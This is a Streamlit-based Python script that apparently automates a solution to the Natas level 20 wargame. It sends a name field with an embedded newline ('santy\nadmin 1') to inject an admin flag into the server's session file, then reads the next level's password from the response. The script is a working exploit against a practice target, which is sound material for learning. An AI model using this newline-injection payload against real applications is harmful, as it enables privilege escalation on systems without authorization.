import streamlit as st
import re

def run(context, session, base_url):
    st.info("Targeting Custom Session Serialization via Carriage Return Line Feed (CRLF) structural manipulation...")
    
    # 1. Align active level credentials
    username = "natas20"
    current_password = context.get('password', '').strip()
    session.auth = (username, current_password)
    
    # Ensure fresh state tracking parameters by purging historical cookies
    session.cookies.clear()
    
    # 2. Fire Request 1: Injecting the newline structure to alter file schema properties
    st.write("Sending parameter payload containing structural newline injector...")
    
    # We pass 'admin 1' separated by an explicit newline character code
    payload_data = {"name": "santy\nadmin 1"}
    
    try:
        # Submit the injector payload via POST
        response1 = session.post(base_url, data=payload_data, timeout=10)
        
        if "PHPSESSID" not in session.cookies:
            st.error("The server did not assign a tracking cookie. Verify network connectivity.")
            return
            
        active_sid = session.cookies.get("PHPSESSID")
        st.write(f" └─ Structural payload accepted! Captured Active Tracking Token ID: `{active_sid}`")
        
        # 3. Fire Request 2: Re-requesting the page using our modified session file state
        st.write("🔄 Re-requesting target framework to trigger administrative file read sequence...")
        response2 = session.get(base_url, timeout=10)
        
        # Look for our flag or admin promotion indicator
        if "You are an admin" in response2.text:
            st.success("🎯 Session structural state map promoted to Admin successfully!")
            
            # Extract all potential 32/64 character password strings
            all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b|\b[A-Za-z0-9]{64}\b', response2.text)
            new_tokens = [t for t in all_tokens if t != current_password]
            
            if new_tokens:
                st.success("🎯 Level 20 challenge resolved successfully!")
                st.code(f"Natas 21 Password: {new_tokens[0]}")
            else:
                st.warning("Admin access authorized, but token regex filtering returned empty arrays.")
                with st.expander("Examine Page Content Payload"):
                    st.code(response2.text, language="html")
        else:
            st.error("Session profile loaded but administrative context promotion was rejected.")
            with st.expander("Examine Page Canvas Layout"):
                st.code(response2.text, language="html")
                
    except Exception as e:
        st.error(f"Execution failed due to connection error elements: {str(e)}")